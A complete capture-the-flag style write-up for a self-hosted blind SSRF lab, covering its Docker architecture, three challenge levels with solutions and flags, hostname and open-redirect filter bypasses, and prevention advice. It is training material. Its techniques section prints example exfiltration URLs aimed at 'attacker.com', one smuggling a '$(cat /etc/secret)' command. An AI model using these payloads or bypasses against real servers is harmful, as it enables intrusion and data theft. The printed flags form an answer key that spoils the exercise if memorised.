# Blind SSRF Lab - Complete Writeup

## Table of Contents
1. [Introduction](#introduction)
2. [Lab Architecture](#lab-architecture)
3. [Lab Setup](#lab-setup)
4. [What is Blind SSRF?](#what-is-blind-ssrf)
5. [Challenge Levels](#challenge-levels)
6. [Solutions](#solutions)
7. [Blind SSRF Exploitation Techniques](#blind-ssrf-exploitation-techniques)
8. [Prevention](#prevention)

---

## Introduction

This lab teaches **Blind Server-Side Request Forgery (Blind SSRF)** - a variant where the server makes HTTP requests to URLs you provide, but **never shows you the response**. You must use out-of-band (OOB) techniques to detect and exfiltrate data.

**Lab URL:** `http://YOUR_IP:8042/`
**Interceptor URL:** `http://YOUR_IP:8042/interceptor/`
**Flag Format:** `IDS{32_character_hexadecimal}`

**Key Difference from Regular SSRF:** The response from the SSRF target is NEVER shown to the user. You must exfiltrate data through the interceptor.

---

## Lab Architecture

```
+-------------------+       Docker Network (172.32.0.0/16)
|                   |       +---------------------------+
|  User (Browser)   |       |                           |
|       |           |       |  +---------------------+  |
|       v           |       |  | blind-ssrf-app      |  |
|  http://IP:8042 --+-------+->| 172.32.0.10:80      |  |
|                   |       |  | (Vulnerable App +   |  |
|                   |       |  |  Interceptor)       |  |
|                   |       |  +----------+----------+  |
|                   |       |             |              |
|                   |       |    BLIND SSRF (no response)|
|                   |       |             |              |
|                   |       |  +----------v----------+  |
|                   |       |  | blind-internal-api  |  |
|                   |       |  | 172.32.0.50:80      |  |
|                   |       |  | NO EXTERNAL PORT    |  |
|                   |       |  | (Flags + Exfil)     |  |
|                   |       |  +---------------------+  |
|                   |       +---------------------------+
```

**Key components:**
- `blind-ssrf-app` (port 8042): Vulnerable app + built-in interceptor at `/interceptor/`
- `blind-internal-api` (no external port): Internal service with flags + exfiltration endpoint
- Uses **cURL with HTTP/HTTPS only** (blocks file:// to prevent LFI)

### The Exfiltration Chain

Blind SSRF requires a two-step attack to steal data:

```
1. User -> blind-ssrf-app: "Fetch http://blind-internal-api/exfil?level=1&target=http://blind-ssrf-app/interceptor/"
2. blind-ssrf-app -> blind-internal-api: Makes blind request (no response shown)
3. blind-internal-api -> blind-ssrf-app/interceptor: Sends flag to interceptor
4. User checks interceptor logs -> finds the flag!
```

---

## Lab Setup

```bash
cd /home/devuser/documents/tools/blind-ssrf-lab/
sudo docker-compose up -d --build
```

Access at `http://localhost:8042/`

---

## What is Blind SSRF?

| Aspect | Regular SSRF | Blind SSRF |
|--------|--------------|------------|
| Response visible? | Yes | **No** |
| Error messages? | Yes | **No** |
| Detection method | Read response directly | OOB / interceptor |
| Data exfiltration | Direct from response | Requires callback |

In Blind SSRF, the attacker must use the server as a proxy to reach internal services, but cannot see what those services return. Data must be exfiltrated through an intermediary (interceptor/collaborator).

---

## Challenge Levels

### Level 1: Basic Blind SSRF (Medium)
**Objective:** Use the internal API's exfiltration endpoint to send the flag to the interceptor.

**No filtering.** The internal API hostname is `blind-internal-api`.

**Flag:** `IDS{ad906fa9d8e119345a2164fa198b3e68}`

---

### Level 2: Filtered Blind SSRF (Hard)
**Objective:** Bypass hostname blocking to reach the internal API.

**Blocked:** `blind-internal-api` (hostname only)

The internal API still runs at IP `172.32.0.50`.

**Flag:** `IDS{4b6ed995864f8f6939807719291bc1ab}`

---

### Level 3: Advanced Blind SSRF (Hard)
**Objective:** Bypass both hostname AND IP blocking using the app's open redirect.

**Blocked:** `blind-internal-api`, `172.32.0.50`

The app has an open redirect at `/redirect?dest=URL`. The filter only checks the initial URL host.

**Flag:** `IDS{ef9310f31e2891c5c9369adf330944f9}`

---

## Solutions

### Level 1 Solution: Basic Exfiltration

The internal API has an exfiltration endpoint that sends the flag to a target URL.

**Step 1:** Trigger blind SSRF to the exfil endpoint:
```
URL: http://blind-internal-api/exfil?level=1&target=http://blind-ssrf-app/interceptor/
```

**Step 2:** Check the interceptor logs:
```bash
curl "http://localhost:8042/interceptor/?show_logs=1"
```

**Expected in logs:**
```
*** FLAG EXFILTRATED (Level 1) ***
Flag: IDS{ad906fa9d8e119345a2164fa198b3e68}
```

**What happened:**
1. Your browser told the server to fetch `http://blind-internal-api/exfil?...`
2. The server made a blind request to the internal API
3. The internal API read flag1 and sent it to `http://blind-ssrf-app/interceptor/`
4. The interceptor logged the flag
5. You checked the interceptor and found the flag

---

### Level 2 Solution: IP Bypass

The hostname `blind-internal-api` is blocked. Use the IP instead:

```
URL: http://172.32.0.50/exfil?level=2&target=http://blind-ssrf-app/interceptor/
```

Check interceptor logs for the flag.

**Flag:** `IDS{4b6ed995864f8f6939807719291bc1ab}`

---

### Level 3 Solution: Open Redirect Bypass

Both `blind-internal-api` and `172.32.0.50` are blocked. Use the open redirect:

```
URL: http://localhost/redirect?dest=http://blind-internal-api/exfil?level=3&target=http://blind-ssrf-app/interceptor/
```

**How it works:**
1. Filter checks host: `localhost` - not blocked
2. Server fetches `http://localhost/redirect?dest=...`
3. The redirect endpoint returns 302 to `http://blind-internal-api/exfil?...`
4. cURL follows the redirect (CURLOPT_FOLLOWLOCATION)
5. The exfil chain executes and the flag reaches the interceptor

**Flag:** `IDS{ef9310f31e2891c5c9369adf330944f9}`

---

## Blind SSRF Exploitation Techniques

### 1. Out-of-Band Data Exfiltration
```
http://internal-service/exfil?data=secret&target=http://attacker.com/collect
```

### 2. Interceptor/Collaborator Services
- **Burp Collaborator** - Built into Burp Suite
- **Interact.sh** - Open source OOB tool
- **Webhook.site** - Free HTTP request logging
- **This lab's interceptor** - `/interceptor/` endpoint

### 3. DNS Exfiltration
```
http://internal-service/?data=$(cat /etc/secret).attacker.com
```

### 4. Timing-Based Detection
- Fast response = blocked/failed
- Slow response = request went through

---

## Prevention

1. **Whitelist allowed destinations** (not blacklist)
2. **Disable redirect following** in HTTP clients
3. **Validate final destination** after redirects
4. **Block outbound traffic** from application servers
5. **Use IMDSv2** for cloud metadata (requires session token)
6. **Network segmentation** - isolate internal services
